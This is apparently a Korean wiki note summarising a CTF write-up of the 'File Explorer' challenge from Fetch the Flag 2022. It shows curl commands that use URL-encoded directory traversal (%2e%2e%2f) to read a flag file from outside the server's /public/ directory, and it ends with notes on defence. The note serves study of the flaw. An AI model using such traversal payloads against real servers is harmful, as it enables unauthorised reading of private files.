---
title: File Explorer — Fetch the Flag CTF 2022 writeup
created: 2026-06-19
updated: 2026-06-21
type: query
tags: [ctf, web, writeup, path-traversal, directory-traversal, file-read, tampering]
sources: [https://www.snyk.io/blog/fetch-the-flag-ctf-2022-writeup-file-explorer/]
confidence: high
---

# File Explorer — Fetch the Flag CTF 2022 writeup

> `st` 기반 정적 파일 서버에서 URL-encoded traversal을 이용해 `/public/` 바깥의 flag를 읽는 writeup입니다.

## 참고 URL
- [www.snyk.io](https://www.snyk.io/blog/fetch-the-flag-ctf-2022-writeup-file-explorer/)


## 1. 한 줄 요약
- `/public/` 경로가 노출됩니다.
- `../`는 정규화되지만 URL-encoded traversal은 막히지 않습니다.
- `%2e%2e%2f`로 상위 디렉터리로 탈출해 flag 파일을 읽습니다.

## 2. 문제 구조
| 항목 | 내용 |
|---|---|
| 플랫폼 | Fetch the Flag CTF 2022 |
| 핵심 아이디어 | directory traversal, URL encoding bypass, file read |
| 관련 개념 | [[path-traversal-ctf-patterns]], [[file-upload-ctf-patterns]], [[web-ctf-writeup-family-hub]] |
| 관련 survey | [[file-upload-path-traversal-writeup-survey]] |

## 3. 공격면 정리
1. 사이트가 `/public/` 파일 서빙을 한다는 점을 확인합니다.
2. `../` 대신 `%2e%2e%2f`를 사용합니다.
3. traversal을 반복해 `flag` 파일에 도달합니다.

## 4. 풀이 흐름
```bash
# 1) public 디렉터리 확인
curl http://file-explorer.c.ctf-snyk.io/public/

# 2) URL-encoded traversal
curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f/

# 3) flag 읽기
curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f/flag
```

## 5. 왜 취약한가
- 정적 파일 서버가 경로 정규화만으로 충분하다고 가정합니다.
- 인코딩된 traversal을 검사하지 못합니다.
- 공개 경로와 비공개 경로의 경계가 느슨합니다.

## 6. 방어 관점
- traversal을 디코딩 후 검사합니다.
- 허용된 루트 아래의 파일만 매핑합니다.
- 경로를 문자열이 아니라 안전한 path API로 다룹니다.

## 7. 다음 연결
- [[file-upload-path-traversal-writeup-survey]]
- [[path-traversal-ctf-patterns]]
- [[web-ctf-writeup-storage-upload]]
